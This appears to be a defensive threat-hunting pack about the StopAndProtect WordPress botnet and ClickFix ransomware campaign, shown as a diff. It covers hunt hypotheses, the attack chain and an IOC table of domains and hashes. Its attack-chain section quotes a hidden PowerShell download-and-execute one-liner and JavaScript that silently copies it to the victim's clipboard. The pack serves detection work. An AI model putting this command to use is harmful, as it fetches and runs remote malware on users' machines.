@@ -1,0 +1,1040 @@
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --text: #e6edf3;
+  --text-muted: #8b949e;
+  --accent: #b3261e;
+  --accent-dim: rgba(179,38,30,0.14);
+  --red: #f85149; --yellow: #d29922; --green: #7ee787; --purple: #d2a8ff; --blue: #58a6ff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; line-height: 1.6; }
+
+/* Fixed LEFT sidebar TOC */
+#sidebar { position: fixed; top: 0; left: 0; width: 210px; height: 100vh; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; z-index: 100; transition: transform 0.2s ease; }
+.sidebar-logo { padding: 14px 14px 12px; border-bottom: 1px solid var(--border); }
+.sidebar-logo .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent); font-weight: 700; }
+.sidebar-logo .pack-name { font-size: 12px; color: var(--text); font-weight: 600; margin-top: 3px; line-height: 1.3; }
+.sidebar-logo .version { font-size: 10px; color: var(--text-muted); margin-top: 2px; }
+#sidebar nav { padding: 8px 0; }
+#sidebar nav a { display: block; padding: 4px 14px 4px 16px; color: var(--text-muted); text-decoration: none; font-size: 11.5px; border-left: 2px solid transparent; transition: all 0.12s; }
+#sidebar nav a:hover, #sidebar nav a.active { color: var(--accent); background: var(--accent-dim); border-left-color: var(--accent); }
+#sidebar nav .nav-section { padding: 10px 14px 3px; font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: #444d56; font-weight: 700; }
+
+/* Show/hide toggle */
+#toc-toggle { position: fixed; top: 10px; left: 172px; z-index: 200; background: var(--surface2); color: var(--accent); border: 1px solid var(--accent); border-radius: 5px; padding: 4px 9px; font-size: 13px; line-height: 1; cursor: pointer; transition: left 0.2s ease; font-family: inherit; }
+#toc-toggle:hover { background: var(--accent-dim); }
+#main { margin-left: 210px; padding: 24px 28px 80px; max-width: 1060px; transition: margin-left 0.2s ease; }
+body.toc-collapsed #sidebar { transform: translateX(-100%); }
+body.toc-collapsed #main { margin-left: 0; }
+body.toc-collapsed #toc-toggle { left: 10px; }
+@media (max-width: 768px) { #sidebar { transform: translateX(-100%); } #main { margin-left: 0; } #toc-toggle { left: 10px; } body.toc-shown #sidebar { transform: translateX(0); } }
+
+/* Header */
+.hp-header { background: linear-gradient(140deg, #2a0808 0%, var(--surface) 60%); border: 1px solid var(--accent); border-radius: 8px; padding: 22px 24px; margin-bottom: 24px; }
+.hp-header h1 { font-size: 20px; color: var(--accent); font-weight: 700; letter-spacing: -0.01em; }
+.hp-header .subtitle { font-size: 12px; color: var(--text-muted); margin-top: 3px; margin-bottom: 14px; }
+.meta-grid { display: flex; flex-wrap: wrap; gap: 18px; }
+.meta-item .mk { font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); }
+.meta-item .mv { font-size: 12px; color: var(--text); font-weight: 600; }
+
+/* Sections */
+.section { margin-bottom: 28px; scroll-margin-top: 16px; }
+.section-hdr { display: flex; align-items: center; gap: 8px; padding: 9px 14px; background: var(--surface); border: 1px solid var(--border); border-radius: 6px 6px 0 0; }
+.section-hdr h2 { font-size: 13px; font-weight: 600; color: var(--text); }
+.snum { font-size: 10px; color: var(--accent); font-weight: 700; background: var(--accent-dim); padding: 1px 6px; border-radius: 3px; }
+.section-body { background: var(--surface); border: 1px solid var(--border); border-top: none; border-radius: 0 0 6px 6px; padding: 16px; }
+
+/* Tables + badges */
+table { width: 100%; border-collapse: collapse; font-size: 12px; display: block; overflow-x: auto; max-width: 100%; }
+th { background: var(--surface2); color: var(--text-muted); text-transform: uppercase; font-size: 9.5px; letter-spacing: 0.06em; padding: 6px 10px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; }
+td { padding: 6px 10px; border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.5; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--surface2); }
+.badge { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; }
+.b-high { background: rgba(248,81,73,0.18); color: #f85149; }
+.b-med { background: rgba(210,153,34,0.18); color: #d29922; }
+.b-low { background: rgba(126,231,135,0.18); color: #7ee787; }
+.b-crit { background: rgba(248,81,73,0.28); color: #ff7b72; border: 1px solid #f85149; }
+.b-info { background: rgba(88,166,255,0.15); color: #58a6ff; }
+.b-purple { background: rgba(210,168,255,0.15); color: #d2a8ff; }
+
+/* Query cards + cloud selector (CQL section) */
+.cloud-sel { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; padding: 7px 12px; background: var(--surface); border: 1px solid var(--accent); border-radius: 6px; font-size: 11px; margin-bottom: 14px; }
+.cloud-sel label { color: var(--text-muted); }
+.cloud-hint { color: var(--text-muted); flex: 1 1 240px; min-width: 0; }
+.cloud-sel select { background: var(--surface2); color: var(--text); border: 1px solid var(--border); border-radius: 4px; padding: 2px 7px; font-size: 11px; cursor: pointer; font-family: inherit; }
+.query-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 14px; overflow: hidden; }
+.qc-header { display: flex; align-items: center; justify-content: space-between; padding: 9px 12px; background: var(--accent-dim); border-bottom: 1px solid var(--border); flex-wrap: wrap; gap: 8px; }
+.qc-title { font-size: 12.5px; font-weight: 600; color: var(--text); }
+.qc-badges { display: flex; gap: 5px; flex-wrap: wrap; }
+.qc-actions { display: flex; gap: 6px; }
+.qc-actions button { padding: 3px 9px; border-radius: 4px; font-size: 10.5px; font-weight: 600; cursor: pointer; border: 1px solid; transition: all 0.12s; font-family: inherit; }
+.btn-copy { background: var(--accent-dim); color: var(--accent); border-color: var(--accent); }
+.btn-copy.copied { background: rgba(126,231,135,0.18); color: #7ee787; border-color: #7ee787; }
+.btn-falcon { background: rgba(88,166,255,0.1); color: #58a6ff; border-color: rgba(88,166,255,0.5); }
+.btn-falcon:hover { background: rgba(88,166,255,0.22); }
+.qc-body { padding: 12px; }
+pre.cql { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Fira Code','Consolas',monospace; font-size: 11px; line-height: 1.55; overflow-x: auto; color: #e6edf3; }
+.cm { color: #8b949e; font-style: italic; }
+pre.code { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; line-height: 1.5; overflow-x: auto; color: #e6edf3; margin: 6px 0; white-space: pre; }
+
+/* IOC quick-copy grid, hardening tiers, callouts, changelog */
+.ioc-grab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(330px, 1fr)); gap: 12px; margin: 10px 0 18px; }
+.ioc-grab { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 10px 12px; }
+.ioc-grab .igh { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+.igt { font-size: 11.5px; font-weight: 700; color: var(--text); }
+.igc { font-size: 9.5px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+.tier-blk { border: 1px solid var(--border); border-radius: 6px; padding: 11px 13px; margin-bottom: 10px; background: var(--surface2); }
+.tier-imm { border-left: 3px solid #f85149; } .tier-near { border-left: 3px solid #d29922; } .tier-strat { border-left: 3px solid #58a6ff; }
+.tier-lbl { font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 5px; }
+.tier-imm .tier-lbl { color: #f85149; } .tier-near .tier-lbl { color: #d29922; } .tier-strat .tier-lbl { color: #58a6ff; }
+.callout { display: block; padding: 9px 12px; border-radius: 5px; margin: 8px 0; font-size: 12px; line-height: 1.5; }
+.callout-warn { background: rgba(210,153,34,0.1); border: 1px solid rgba(210,153,34,0.35); color: #d29922; }
+.callout-info { background: rgba(88,166,255,0.09); border: 1px solid rgba(88,166,255,0.3); color: #58a6ff; }
+.callout-danger { background: rgba(248,81,73,0.09); border: 1px solid rgba(248,81,73,0.3); color: #f85149; }
+.chg-entry { display: flex; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+.chg-ver { color: var(--accent); min-width: 40px; font-weight: 700; } .chg-date { color: var(--text-muted); min-width: 88px; }
+p { margin-bottom: 7px; font-size: 13px; } ul, ol { padding-left: 18px; margin: 6px 0; } li { font-size: 12.5px; margin-bottom: 3px; }
+a { color: var(--accent); text-decoration: none; } a:hover { text-decoration: underline; }
+h3 { font-size: 12.5px; font-weight: 700; margin: 13px 0 7px; color: var(--text); } h4 { font-size: 12px; font-weight: 600; margin: 9px 0 5px; color: var(--text-muted); }
+code { background: var(--surface2); border: 1px solid var(--border); border-radius: 3px; padding: 0 4px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; color: var(--accent); }
+.ticket { background: #010409; border: 1px solid var(--accent); border-radius: 6px; padding: 4px; }
+#sidebar{scrollbar-width:none}#sidebar::-webkit-scrollbar{display:none}
+</style>
+
+<button id="toc-toggle" onclick="toggleToc()" title="Show / hide table of contents" aria-label="Show or hide table of contents">☰</button>
+
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="brand"><a href="https://slapopotamus.github.io/HuntPack/" style="color:inherit;text-decoration:none" title="HuntPack library — home">HUNTPACK</a></div>
+    <div class="pack-name">StopAndProtect — WordPress Botnet, ClickFix Ransomware &amp; Data-Theft Operation</div>
+    <div class="version">v0.1 · 2026-08-21</div>
+  </div>
+  <nav>
+    <div class="nav-section">Overview</div>
+    <a href="#s1">1 · Executive Summary</a>
+    <a href="#s2">2 · Source Review</a>
+    <a href="#s3">3 · Hunt Brief &amp; Chain</a>
+    <a href="#s4">4 · IOC Table</a>
+    <a href="#s5">5 · Affected Surface</a>
+    <a href="#s6">6 · ATT&amp;CK Mapping</a>
+    <div class="nav-section">Detection</div>
+    <a href="#s7">7 · Native Hunts</a>
+    <a href="#s8">8 · CQL Queries</a>
+    <a href="#s9">9 · Custom IOA Recs</a>
+    <a href="#s10">10 · IOC Appendix</a>
+    <a href="#s11">11 · Validation Gates</a>
+    <div class="nav-section">Response</div>
+    <a href="#s12">12 · Hardening</a>
+    <a href="#s13">13 · Playbooks</a>
+    <a href="#s14">14 · Containment</a>
+    <div class="nav-section">Meta</div>
+    <a href="#s15">15 · Coverage Map</a>
+    <a href="#s16">16 · Hunt Ticket</a>
+    <a href="#s17">17 · Changelog</a>
+    <a href="#s18">18 · References</a>
+  </nav>
+</nav>
+
+<div id="main">
+
+<div class="hp-header">
+  <h1>StopAndProtect — WordPress Botnet, ClickFix Ransomware &amp; Data-Theft Operation</h1>
+  <div class="subtitle">Nearly 2,000 hijacked WordPress sites used as rotating C2/distribution infrastructure · fake-CAPTCHA ClickFix lure → PowerShell → .NET loader chain → SilentEncryptor ransomware, SilentDataCollector stealer, NetworkShareScanner SMB/USB worm · disclosed by Check Point Research 2026-08-18</div>
+  <div class="meta-grid">
+    <div class="meta-item"><div class="mk">Severity</div><div class="mv"><span class="badge b-crit">CRITICAL — DOUBLE-EXTORTION RANSOMWARE + DATA THEFT + WORM</span></div></div>
+    <div class="meta-item"><div class="mk">Type</div><div class="mv">Social-Engineering Initial Access — Compromised-Web-Infra C2 — Multi-Payload Crimeware</div></div>
+    <div class="meta-item"><div class="mk">Access</div><div class="mv">User-executed PowerShell (ClickFix fake CAPTCHA) — no exploit required</div></div>
+    <div class="meta-item"><div class="mk">Version</div><div class="mv">v0.1 (Draft) · 2026-08-21</div></div>
+    <div class="meta-item"><div class="mk">Author</div><div class="mv">HuntPack</div></div>
+    <div class="meta-item"><div class="mk">Confidence</div><div class="mv">High — primary vendor research (Check Point) with full IOC/YARA disclosure, corroborated by 3 independent outlets</div></div>
+  </div>
+</div>
+
+<div class="section" id="s1">
+  <div class="section-hdr"><span class="snum">01</span><h2>Executive Summary</h2></div>
+  <div class="section-body">
+    <p>Check Point Research disclosed <strong>StopAndProtect</strong> on 2026-08-18: a criminal operation that has hijacked nearly 2,000 compromised WordPress sites and turned them into a rotating pool of command-and-control and distribution infrastructure. An operational-security failure by the operator — an exposed staging server with directory listings enabled — let researchers pull internal infection logs, roughly 31,000 exfiltrated victim screenshots, and the actor's own source code. Those logs place more than 6,000 unique victim IP addresses on the board as of 2026-07-24, concentrated in the United States (1,852), Russia (630), and India (630).</p>
+    <p>The infection chain starts with <strong>ClickFix</strong>: a fake CAPTCHA overlay on a compromised WordPress site instructs the visitor to open the Windows Run dialog and paste a command, which launches a hidden, execution-policy-bypassed PowerShell one-liner (<code>IEX((New-Object Net.WebClient).DownloadString('https://&lt;C&amp;C&gt;/vcapcha.ps1'))</code>) — a Win+R "paste and run" pattern with no file argument on the command line. That script chains into a second PowerShell stage, then two .NET downloader/loader stages, before dropping whichever payload modules the operator has staged: <strong>SilentEncryptor</strong> (double-extortion ransomware whose key derivation embeds the per-file password and machine name in the renamed encrypted filename), <strong>SilentDataCollector</strong> (a credential/document/screenshot stealer with a keylogger and WhatsApp-contact-exfiltration feature), <strong>LockScreen</strong> (blocks input, shows a payment QR code), <strong>NetworkShareScanner</strong> (an SMB/USB worm module), a <strong>VBS spreader</strong> (removable-media and WMI-based lateral movement), and <strong>SimpleChatProxy</strong> (a bespoke victim/operator chat channel). Notably, StopAndProtect does not always deploy ransomware — in many cases the operator silently inventories and exfiltrates files first and decides monetization on a per-victim basis, consistent with hands-on-keyboard activity Check Point observed directly in exfiltrated WhatsApp-search screenshots.</p>
+    <p>On the WordPress side, persistence rides on a hidden must-use plugin (<code>wp-content/mu-plugins/wp-sec.php</code>) that exposes an unauthenticated-looking REST upload endpoint, plus a single-file PHP web shell (<code>wp-cssv.php</code>) and a "verify" plugin (<code>verify.php</code>/<code>store.php</code>/<code>proxy.php</code>/<code>stored_url.txt</code>) that renders the fake CAPTCHA itself and reports statistics back to the operator. One analyzed compromised site had gone unpatched since 2021 with roughly 40 known vulnerabilities — outdated WordPress installations are the entry vector, not a novel WordPress zero-day.</p>
+    <p class="callout callout-danger"><strong>Defender priority:</strong> This is a social-engineering attack — EDR prevention policy will not stop a user who was told to paste the command, so detection has to center on the two behavioral chokepoints in this pack: (1) <code>explorer.exe</code> parenting a hidden, policy-bypassed <code>powershell.exe</code> with no <code>-File</code> argument (Section 8, Q1–Q3), and (2) the PowerShell→.NET downloader chain writing and executing a new binary from a user-writable path (Q4). Atomic IOCs (Section 4/10) are worth deploying today but are perishable — the WordPress-hosted C2 domains and mu-plugin backdoors are likely to rotate or be taken down quickly following public disclosure.</p>
+  </div>
+</div>
+
+<div class="section" id="s2">
+  <div class="section-hdr"><span class="snum">02</span><h2>Source Review &amp; Web Hunter Notes</h2></div>
+  <div class="section-body">
+    <p>Five sources were targeted for this pack. Four were successfully fetched and saved verbatim (or, where direct fetch was bot-blocked, retrieved through a fallback fetch path and saved with that method noted) to the pack's source-snapshot directory for provenance tracing. All four were reviewed for prompt-injection or untrusted directives before use; none were found. One source was inaccessible and dropped — see below.</p>
+    <table>
+      <tr><th>Tier</th><th>Source</th><th>Key Finding</th><th>Carry Forward</th></tr>
+      <tr><td><span class="badge b-info">1</span></td><td>Check Point Research (research.checkpoint.com) — original vendor disclosure</td><td>Full infection-chain narrative, complete hash table by stage, YARA rule, victim-IP statistics by country, WordPress backdoor/web-shell technical detail, ClickFix JavaScript excerpt, exposed attacker project-path artifacts</td><td>Yes — primary source of record; every atomic IOC in this pack traces to this snapshot</td></tr>
+      <tr><td><span class="badge b-med">2</span></td><td>The Hacker News</td><td>News-aggregator corroboration of the operation name, scale, and infection-chain summary</td><td>Partial — context and corroboration only</td></tr>
+      <tr><td><span class="badge b-med">2</span></td><td>Cybersecurity News</td><td>Corroborates victim geography, the "unpatched since 2021 / ~40 vulnerabilities" root-cause detail, and the OPSEC-failure discovery narrative. Fetched via a fallback path after the direct request was bot-blocked (HTTP 403); the retrieved text is the outlet's own article summary, not a raw byte-for-byte page capture.</td><td>Partial — corroboration only; no atomic IOCs sourced from this outlet</td></tr>
+      <tr><td><span class="badge b-med">2</span></td><td>GBHackers</td><td>Independent re-transcription of Check Point's full IOC table (domains, hashes) and additional narrative detail on the mu-plugins persistence mechanism. Fetched via a fallback path after the direct request was bot-blocked (HTTP 403). Cross-checked hash-for-hash against the primary Check Point snapshot — all values matched exactly, including the corrected SilentDataCollector hash (see note below).</td><td>Partial — corroboration only; all IOCs shipped in this pack are sourced from the primary Check Point snapshot, not from this re-transcription</td></tr>
+    </table>
+    <p><strong>Dropped source:</strong> <a href="https://databreaches.net/2026/08/19/server-mistake-exposes-stopandprotects-hacked-wordpress-network/" target="_blank" rel="noopener">databreaches.net</a> returned an HTTP 403 Cloudflare bot-detection block on both a direct fetch attempt and a fallback fetch attempt. This is a plain access failure, not adversarial content encountered in a retrieved page — no content was ever retrieved from this URL, so there was nothing to screen for injected instructions. It is dropped from citations; no claim or IOC in this pack relies on it.</p>
+    <p><strong>Note on a hash discrepancy caught during provenance verification:</strong> the SilentDataCollector (credential stealer) SHA256 supplied in the initial build brief for this pack (ending <code>...3cd7e4a1eb365f...</code>) did not match the value in the primary Check Point source when checked byte-for-byte against the raw page capture. The verified, source-correct value — <code>23cbabfe3ca3a7f1eb365f772d6a4ed8095cb8f7755622cc82e804478259dc70</code> — is what ships in this pack (Section 4/10). This is flagged explicitly because it is exactly the kind of single-character transcription drift the provenance gate exists to catch.</p>
+  </div>
+</div>
+
+<div class="section" id="s3">
+  <div class="section-hdr"><span class="snum">03</span><h2>Hunt Brief &amp; Attack Chain</h2></div>
+  <div class="section-body">
+    <h3>Hunt Hypotheses (ordered by fidelity)</h3>
+    <ol>
+      <li><strong>[High]</strong> <code>explorer.exe</code> (Run dialog) directly parents a hidden, execution-policy-bypassed <code>powershell.exe</code>/<code>pwsh.exe</code> with an inline download-and-execute command and no <code>-File</code> argument — the ClickFix detonation moment. <em>Covers T1204.004, T1059.001, T1564.003, T1562.001. Maps to Q1.</em></li>
+      <li><strong>[High]</strong> The pasted command is recoverable from the <code>RunMRU</code> registry key even after process telemetry ages out. <em>Covers T1204.004. Maps to Q2.</em></li>
+      <li><strong>[High]</strong> A command line or on-disk file references the campaign's known entry-script name, <code>vcapcha.ps1</code>. <em>Covers T1204.004, T1105. Maps to Q3.</em></li>
+      <li><strong>[High]</strong> A process image or written file matches one of the 21 confirmed StopAndProtect stage hashes (PowerShell stages, .NET loaders, and all six payload modules). <em>Covers T1105, T1486, T1490, T1039, T1091. Maps to Q5.</em></li>
+      <li><strong>[High]</strong> A host resolves or connects to one of the five confirmed WordPress-hosted base C2 domains. <em>Covers T1071.001, T1102. Maps to Q6.</em></li>
+      <li><strong>[Medium]</strong> PowerShell writes and/or executes a new PE from a user-writable directory — the PowerShell→.NET downloader/loader chain's detonation step. <em>Covers T1105, T1027, T1059.001. Maps to Q4.</em></li>
+      <li><strong>[Medium]</strong> A host shows a mass file-rename/encryption volume spike, optionally paired with a shadow-copy-deletion or recovery-inhibition command — SilentEncryptor's impact stage. <em>Covers T1486, T1490. Maps to Q7, Q8.</em></li>
+      <li><strong>[Medium]</strong> A host performs SMB-share or removable-media discovery consistent with the NetworkShareScanner worm module, or <code>WmiPrvSE.exe</code> spawns a script/command interpreter consistent with the VBS spreader's WMI-based lateral movement. <em>Covers T1135, T1120, T1039, T1047, T1091. Maps to Q9, Q10.</em></li>
+      <li><strong>[Medium — organization-hosted WordPress only]</strong> A Linux/web-server host running a Falcon sensor writes one of the named attacker PHP artifacts or the <code>stored_url.txt</code> marker file — evidence the organization's own WordPress site is being used as StopAndProtect infrastructure, not just that an employee visited one. <em>Covers T1505.003, T1190. Maps to Q11.</em></li>
+    </ol>
+    <h3>Attack Chain</h3>
+    <p>Illustrative ClickFix command excerpted from the primary source (Check Point Research), shown for detection-engineering purposes — this is not exploit code, it is the exact shape defenders need to recognize:</p>
+    <pre class="code">const command = `powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://&lt;C&amp;C&gt;/vcapcha.ps1'))`;
+navigator.clipboard.writeText(command)   // silently placed on the victim's clipboard by the fake CAPTCHA page</pre>
+    <table>
+      <tr><th>Step</th><th>Action</th><th>Telemetry</th><th>Hunt Angle</th></tr>
+      <tr><td>0</td><td>WordPress site compromise (root cause per secondary reporting: outdated core/plugins — one analyzed site unpatched since 2021 with ~40 known vulnerabilities), then persistence via a hidden MU-plugin (<code>wp-content/mu-plugins/wp-sec.php</code>, REST endpoint <code>wp-json/wp-sec/v1/upload</code>) and a single-file web shell (<code>wp-cssv.php</code>)</td><td>Web-server file-write telemetry (only if the WordPress host itself runs a Falcon sensor)</td><td>Q11 (org-hosted WordPress only)</td></tr>
+      <tr><td>1</td><td>Victim visits a compromised WordPress site; the "verify" plugin overlays a fake CAPTCHA for Windows visitors and silently copies a PowerShell one-liner to the clipboard</td><td>Not endpoint-visible — this step happens in the browser DOM</td><td>User-awareness training; browser/proxy content filtering</td></tr>
+      <tr><td>2</td><td><strong>Detonation:</strong> victim pastes into Win+R and presses Enter; <code>explorer.exe</code> spawns hidden, policy-bypassed <code>powershell.exe</code> which downloads and executes <code>vcapcha.ps1</code> (PowerShell Stage 1) in memory</td><td><code>ProcessRollup2</code>, <code>RegGenericValueUpdate</code>/<code>AsepValueUpdate</code> (RunMRU)</td><td>Q1, Q2, Q3</td></tr>
+      <tr><td>3</td><td>PowerShell Stage 1 chains into PowerShell Stage 2, then a .NET Stage 1 downloader and a .NET Stage 2 downloader/loader (described by Check Point as a "persistent downloader and loader" with sandbox checks)</td><td><code>ProcessRollup2</code>, <code>NewExecutableWritten</code>/<code>PeFileWritten</code></td><td>Q4, Q5</td></tr>
+      <tr><td>4</td><td>Payload modules dropped per-victim at operator discretion: SilentEncryptor (ransomware), SilentDataCollector (stealer/keylogger), LockScreen, NetworkShareScanner (SMB/USB worm), VBS spreader, SimpleChatProxy</td><td><code>ProcessRollup2</code>, <code>RansomwareOpenFile</code>, <code>NetworkConnectIP4</code></td><td>Q5, Q7, Q8, Q9, Q10</td></tr>
+      <tr><td>5</td><td>Ongoing C2 / exfiltration: stolen files, screenshots, and WhatsApp-contact captures are compressed, encrypted, and sent back to the same rotating pool of compromised WordPress sites acting as base C2</td><td><code>DnsRequest</code>, <code>NetworkConnectIP4</code></td><td>Q6</td></tr>
+      <tr><td>6</td><td>If ransomware is triggered: files renamed to embed the per-file password and machine name, LockScreen displays the payment QR code, SimpleChatProxy opens a victim/operator chat channel</td><td><code>RansomwareOpenFile</code>, file-rename telemetry</td><td>Q7, Q5 (hash match on LockScreen/SimpleChatProxy)</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s4">
+  <div class="section-hdr"><span class="snum">04</span><h2>Consolidated IOC Table</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Type</th><th>Value</th><th>Confidence</th><th>Action</th><th>Context</th><th>Expiry</th></tr>
+      <tr><td>Domain</td><td>v-k.com.ua</td><td>High</td><td>detect</td><td>Compromised WordPress site used as base C2</td><td>2027-02-21</td></tr>
+      <tr><td>Domain</td><td>www.lapellelaser.pl</td><td>High</td><td>detect</td><td>Compromised WordPress site used as base C2</td><td>2027-02-21</td></tr>
+      <tr><td>Domain</td><td>www.parsrulman.com</td><td>High</td><td>detect</td><td>Compromised WordPress site used as base C2</td><td>2027-02-21</td></tr>
+      <tr><td>Domain</td><td>mectcalcutta.com</td><td>High</td><td>detect</td><td>Compromised WordPress site used as base C2</td><td>2027-02-21</td></tr>
+      <tr><td>Domain</td><td>discherniation.com</td><td>High</td><td>detect</td><td>Compromised WordPress site used as base C2</td><td>2027-02-21</td></tr>
+      <tr><td>Filename</td><td>vcapcha.ps1</td><td>High</td><td>hunt</td><td>ClickFix entry script fetched and executed in-memory via IEX; no legitimate use</td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>dwnen.php</td><td>High</td><td>hunt</td><td>Attacker-side WordPress file-listing/download endpoint on compromised C2 hosts</td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>mu-uploader-installer.php</td><td>High</td><td>hunt</td><td>Installer for the hidden must-use uploader plugin</td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>wp-content/mu-plugins/wp-sec.php</td><td>High</td><td>hunt</td><td>Hidden MU plugin dropped by the installer; exposes REST endpoint <code>wp-json/wp-sec/v1/upload</code></td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>verify.php / store.php / proxy.php / stored_url.txt</td><td>High</td><td>hunt</td><td>The "verify" plugin components that render the fake CAPTCHA and report stats to the base C2</td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>wp-cssv.php</td><td>High</td><td>hunt</td><td>Single-file PHP web shell (Secure File Manager) with upload/delete capability</td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>wp-verifyup.php</td><td>High</td><td>hunt</td><td>File Explorer with remote fetch and multi-server fallback</td><td>2026-11-21</td></tr>
+      <tr><td>Endpoint (WordPress)</td><td>wp-uploading.php / wp-delete.php</td><td>High</td><td>hunt</td><td>Secure upload (overwrite/auto-create) and secure-deletion scripts used by the actor's VB6 mass-management tool</td><td>2026-11-21</td></tr>
+      <tr><td>SHA256</td><td>cab7f141fd6f2c58055b3731ef6a64b8a2d4d88a974770b047da19c0904322f0</td><td>High</td><td>detect</td><td>PowerShell script stage 1</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>cc8aa2bd7bf74ca0bbc5cb03a7b18eae73094b450d11654528c05685fe12e0c9</td><td>High</td><td>detect</td><td>PowerShell script stage 2</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>99bcb531d6dd3c93d3f28f03d6e4659c865a4ffbd2fb514e809017f3446a940b</td><td>High</td><td>detect</td><td>.NET stage 1 downloader (variant 1 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>8337bf29100a5871b1275227006dc2a43b21b751e5ce7e2032364fd78af59ac5</td><td>High</td><td>detect</td><td>.NET stage 1 downloader (variant 2 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>4dee2fe98d4da75ffb259c03b50202212dafc85691429a28641a8068eddea504</td><td>High</td><td>detect</td><td>.NET stage 1 downloader (variant 3 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>9765b1342cc7eb982a73bb1f94c6c500b63dc817073b76ea926c1097078d3527</td><td>High</td><td>detect</td><td>.NET stage 2 downloader &amp; loader (variant 1 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>7d3604d0728b242c72bd144b8661ebf63c1042a4f5dd441bc8c8507c701df20c</td><td>High</td><td>detect</td><td>.NET stage 2 downloader &amp; loader (variant 2 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>976cfa57e1efacbe517b7e3441e9473d275ec1d9ad8ab69ddf8ae3a966aaa153</td><td>High</td><td>detect</td><td>.NET stage 2 downloader &amp; loader (variant 3 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>b79b9b027f76579555069a7506d946648a8cb3126c0dda837dc9fee0e5c79489</td><td>High</td><td>detect</td><td>SilentEncryptor ransomware (variant 1 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>65550f6d0ffec8421f703cdc7273d9c0563b3d480fe6702bad294a18afe72143</td><td>High</td><td>detect</td><td>SilentEncryptor ransomware (variant 2 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>0080d0dd72eda4850a02e51c0e5c6f768423dfe970cafae2ab52ceee75972b40</td><td>High</td><td>detect</td><td>SilentEncryptor ransomware (variant 3 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>8d1e23630a6695fa9c793d73832f59436c98bba30ed81c16d01b549bd17feab4</td><td>High</td><td>detect</td><td>NetworkShareScanner SMB/USB worm (variant 1 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>10babb15e08f9fbd72cce11713a273b971c910dd5bdb989a3f6ff4d9c8e372c0</td><td>High</td><td>detect</td><td>NetworkShareScanner SMB/USB worm (variant 2 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>f042240c3de00c46dee625916bf246b7e87481e4081a6a97208b091409766e41</td><td>High</td><td>detect</td><td>NetworkShareScanner SMB/USB worm (variant 3 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>11a635d70444605ede1de0aa227a9fd7cfa4554e75bea93ce18b639ca571a42e</td><td>High</td><td>detect</td><td>LockScreen (variant 1 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>2adbb2c206be7f23bf77f8f50d1ac0f809511c0b4591421931f81a6eaa42c68c</td><td>High</td><td>detect</td><td>LockScreen (variant 2 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>38602b76f6c65644b01fa4d81708251c159a883253cda8876396dc7212324ab9</td><td>High</td><td>detect</td><td>LockScreen (variant 3 of 3)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>23cbabfe3ca3a7f1eb365f772d6a4ed8095cb8f7755622cc82e804478259dc70</td><td>High</td><td>detect</td><td>SilentDataCollector credential/document stealer — <strong>value corrected during provenance verification, see Section 2</strong></td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>b3dff910b350ace27d64cbd79405cb154a1967e366d7b88170c3e8303b1d08ad</td><td>High</td><td>detect</td><td>VBS spreader</td><td>2027-02-21</td></tr>
